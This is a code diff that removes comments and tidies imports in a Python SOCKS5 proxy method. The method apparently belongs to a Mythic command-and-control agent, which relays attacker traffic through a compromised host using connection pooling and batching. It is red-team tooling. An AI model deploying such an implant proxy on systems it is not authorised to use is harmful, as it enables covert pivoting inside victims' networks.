@@ -1,26 +1,20 @@
     def Adv_socks(self, task_id, action, port):
-        import socket, select, queue
-        from threading import Thread, active_count
-        from threading import Lock
+        import socket
+        import select
+        import queue
         from struct import pack, unpack
-        from collections import defaultdict
+        import collections 
         import time
         import base64
         import threading
         
-
-        
-        # Enhanced configuration with fixed defaults
         MAX_THREADS = 300
-        BUFSIZE = 16384  # Increased buffer size for better throughput
-        TIMEOUT_SOCKET = 5 # Reduced socket timeout
+        BUFSIZE = 16384  
+        TIMEOUT_SOCKET = 5 
         OUTGOING_INTERFACE = ""
         
-        # Connection pool configuration
-        MAX_CONNECTIONS_PER_HOST = 15 # Increased max connections per host
-        CONNECTION_POOL_TIMEOUT = 180  # 3 minutes
-        
-        # SOCKS5 protocol constants
+        MAX_CONNECTIONS_PER_HOST = 15
+        CONNECTION_POOL_TIMEOUT = 180  
         VER = b'\x05'
         M_NOAUTH = b'\x00'
         M_NOTAVAILABLE = b'\xff'
@@ -29,23 +23,20 @@
         ATYP_IPV6 = b'\x04'
         ATYP_DOMAINNAME = b'\x03'
         
-        # Performance tuning
-        SOCKS_SLEEP_INTERVAL = 0.001  # Reduced for faster response
-        QUEUE_TIMEOUT = 0.01  # Reduced timeout for better responsiveness
-        BATCH_SIZE = 20  # Process more packets at once
+        SOCKS_SLEEP_INTERVAL = 0.001  
+        QUEUE_TIMEOUT = 0.01  
+        BATCH_SIZE = 20  
         
-        # Connection tracking and statistics
         connection_stats = {
             'active_connections': 0,
             'total_connections': 0,
             'bytes_transferred': 0,
             'failed_connections': 0
         }
-        stats_lock = Lock()
+        stats_lock = threading.Lock()
         
-        # Connection pool for reusing connections
-        connection_pool = defaultdict(list)
-        pool_lock = Lock()
+        connection_pool = collections.defaultdict(list)
+        pool_lock = threading.Lock()
         
         def update_stats(stat_name, value=1):
             with stats_lock:
@@ -57,10 +48,7 @@
                 key = f"{host}:{port}"
                 if key in connection_pool and connection_pool[key]:
                     sock = connection_pool[key].pop()
-                    # Verify connection is still alive without sending data
                     try:
-                        # Check if the socket is still connected and writable
-                        # Using select with a very short timeout for non-blocking check
                         r, w, e = select.select([sock], [sock], [sock], 0)
                         if sock in r or sock in w:
                             return sock
@@ -98,7 +86,6 @@
             }
             
             if priority:
-                # For high priority packets (like connection responses)
                 try:
                     self.socks_out.put(packet, timeout=0.1)
                 except queue.Full:
@@ -111,9 +98,7 @@
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(TIMEOUT_SOCKET)
-                # Enable socket reuse
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                # Optimize for low latency
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 return sock
             except Exception as err:
@@ -121,13 +106,12 @@
         
         def connect_to_dst(dst_addr, dst_port):
             """Enhanced connection with pooling and better error handling"""
-            # Try to get a pooled connection first
             sock = get_pooled_connection(dst_addr, dst_port)
             if sock:
                 return sock
             
             sock = create_socket()
-            if isinstance(sock, str):  # Error message
+            if isinstance(sock, str):  
                 update_stats('failed_connections')
                 return 0
             
@@ -198,25 +182,23 @@
         def create_connection(msg):
             """Enhanced connection creation with better error handling"""
             dst = request_client(msg)
-            rep = b'\x07'  # General SOCKS server failure
-            bnd = b'\x00' * 6  # Default binding
+            rep = b'\x07'  
+            bnd = b'\x00' * 6 
             socket_dst = None
             
             if dst:
                 socket_dst = connect_to_dst(dst[0], dst[1])
             
             if not dst or socket_dst == 0:
-                rep = b'\x01'  # General SOCKS server failure
+                rep = b'\x01' 
             else:
-                rep = b'\x00'  # Success
+                rep = b'\x00'  
                 try:
-                    # Get the actual bound address and port
                     bound_addr, bound_port = socket_dst.getsockname()
                     bnd = socket.inet_aton(bound_addr) + pack(">H", bound_port)
                 except Exception as e:
                     bnd = b'\x00' * 6
             
-            # Build SOCKS5 response
             reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
             
             try:
@@ -244,7 +226,6 @@
             last_activity = time.time()
             
             while True:
-                # Check if task is still active
                 if task_id not in [task["task_id"] for task in self.taskings]:
                     break
                 elif [task for task in self.taskings 
@@ -255,7 +236,6 @@
                     break
                 
                 try:
-                    # Use select with shorter timeout for better responsiveness
                     reader, _, error = select.select([socket_dst], [], [socket_dst], 0.005)
                     
                     if error:
@@ -268,11 +248,9 @@
                                 sendSocksPacket(server_id, b"", True)
                                 break
                             
-                            # Batch small packets for efficiency
                             buffer += data
                             last_activity = time.time()
                             
-                            # Send immediately if buffer is large or hasn't been sent recently
                             if len(buffer) >= BUFSIZE // 4 or time.time() - last_activity > 0.02:
                                 sendSocksPacket(server_id, buffer, False)
                                 update_stats('bytes_transferred', len(buffer))
@@ -281,7 +259,6 @@
                         except socket.error as e:
                             break
                     
-                    # Send any remaining buffered data periodically
                     elif buffer and time.time() - last_activity > 0.05:
                         sendSocksPacket(server_id, buffer, False)
                         update_stats('bytes_transferred', len(buffer))
@@ -292,11 +269,9 @@
                 
                 time.sleep(SOCKS_SLEEP_INTERVAL)
             
-            # Send any remaining buffer data
             if buffer:
                 sendSocksPacket(server_id, buffer, False)
             
-            # Cleanup
             try:
                 socket_dst.close()
             except Exception as e:
@@ -306,7 +281,6 @@
         def m2a(server_id, socket_dst):
             """Mythic to Agent - Enhanced with batching"""
             while True:
-                # Check if task is still active
                 if task_id not in [task["task_id"] for task in self.taskings]:
                     break
                 elif [task for task in self.taskings 
@@ -317,7 +291,6 @@
                     break
                 
                 try:
-                    # Process multiple packets at once for better performance
                     packets_processed = 0
                     while (not self.socks_open[server_id].empty() and 
                            packets_processed < BATCH_SIZE):
@@ -337,7 +310,6 @@
                 
                 time.sleep(SOCKS_SLEEP_INTERVAL)
             
-            # Cleanup
             try:
                 socket_dst.close()
             except Exception as e:
@@ -351,7 +323,6 @@
                     valid_connections = []
                     for conn in connections:
                         try:
-                            # Test if connection is still alive without sending data
                             r, w, e = select.select([conn], [conn], [conn], 0)
                             if conn in r or conn in w:
                                 valid_connections.append(conn)
@@ -364,7 +335,6 @@
                                 pass
                     connection_pool[host_port] = valid_connections
         
-        # Get currently running SOCKS threads
         t_socks = get_running_socks_thread()
         
         if action == "start":
@@ -376,8 +346,7 @@
                 f"[*] Max connections: {MAX_THREADS}, Buffer size: {BUFSIZE}\n"
                 f"[*] Connection pooling enabled (max {MAX_CONNECTIONS_PER_HOST} per host)\n")
             
-            # Start connection cleanup thread
-            cleanup_thread = Thread(target=lambda: [
+            cleanup_thread = threading.Thread(target=lambda: [
                 cleanup_stale_connections() or time.sleep(30) 
                 for _ in iter(int, 1)
             ], daemon=True, name=f"cleanup:{task_id}")
@@ -387,11 +356,9 @@
             last_batch_time = time.time()
             
             while True:
-                # Check if task should stop
                 if [task for task in self.taskings 
                     if task["task_id"] == task_id][0]["stopped"]:
                     
-                    # Print final statistics
                     with stats_lock:
                         stats_msg = (
                             f"[*] SOCKS Proxy Statistics:\n"
@@ -403,14 +370,12 @@
                     self.sendTaskOutputUpdate(task_id, stats_msg)
                     return "[*] Enhanced SOCKS Proxy stopped."
                 
-                # Process incoming packets in batches
                 try:
                     while not self.socks_in.empty() and len(packet_batch) < BATCH_SIZE:
                         packet_json = self.socks_in.get(timeout=QUEUE_TIMEOUT)
                         if packet_json:
                             packet_batch.append(packet_json)
                     
-                    # Process batch or timeout
                     if packet_batch and (len(packet_batch) >= BATCH_SIZE or 
                                        time.time() - last_batch_time > 0.05):
                         
@@ -418,15 +383,13 @@
                             server_id = packet_json["server_id"]
                             
                             if server_id in self.socks_open.keys():
-                                # Existing connection
                                 if packet_json["data"]:
                                     self.socks_open[server_id].put(packet_json["data"])
                                 elif packet_json["exit"]:
                                     self.socks_open.pop(server_id)
                             else:
-                                # New connection
                                 if not packet_json["exit"]:
-                                    if active_count() > MAX_THREADS:
+                                    if threading.active_count() > MAX_THREADS:
                                         time.sleep(0.1)
                                         continue
                                     
@@ -434,13 +397,13 @@
                                     sock = create_connection(packet_json)
                                     
                                     if sock:
-                                        send_thread = Thread(
+                                        send_thread = threading.Thread(
                                             target=a2m, 
                                             args=(server_id, sock),
                                             name=f"a2m:{server_id}",
                                             daemon=True
                                         )
-                                        recv_thread = Thread(
+                                        recv_thread = threading.Thread(
                                             target=m2a, 
                                             args=(server_id, sock),
                                             name=f"m2a:{server_id}",
@@ -460,7 +423,7 @@
                 
                 time.sleep(SOCKS_SLEEP_INTERVAL)
         
-        else:  # stop action
+        else:  
             if len(t_socks) > 0:
                 for t_sock in t_socks:
                     try:
@@ -471,7 +434,6 @@
                     except Exception as e:
                         pass
                 
-                # Clean up connection pool
                 with pool_lock:
                     for connections in connection_pool.values():
                         for conn in connections:
